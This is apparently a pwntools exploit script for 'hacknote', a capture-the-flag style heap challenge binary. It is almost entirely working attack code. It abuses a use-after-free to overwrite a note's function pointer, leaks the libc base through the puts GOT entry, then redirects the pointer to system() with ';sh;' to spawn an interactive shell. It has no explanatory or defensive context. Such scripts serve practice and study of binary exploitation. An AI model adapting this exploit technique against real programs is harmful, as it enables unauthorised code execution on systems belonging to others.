from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './hacknote_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
def add_note(size, content):
    p.sendlineafter('choice :', '1')
    p.sendlineafter('size :', str(size).encode())
    p.sendafter('Content :', content)

def delete_note(index):
    p.sendlineafter('choice :', '2')
    p.sendlineafter('Index :', str(index).encode())

def Print_note(index):
    p.sendlineafter('choice :', '3')
    p.sendlineafter('Index :', str(index).encode())
libc = ELF('./libc_32.so.6')
p = start()
add_note(16, b'a'*4) #0
add_note(16, b'b'*4) #1
delete_note(0)
delete_note(1)
add_note(8, p32(0x0804862B)+p32(elf.got['puts'])) #0
Print_note(0)
libc.address = u32(p.recv(4)) - libc.symbols['puts']
log.info('libc.address: ' + hex(libc.address))
delete_note(2)
add_note(8, p32(libc.symbols['system'])+b';sh;') #0
Print_note(0)
p.interactive()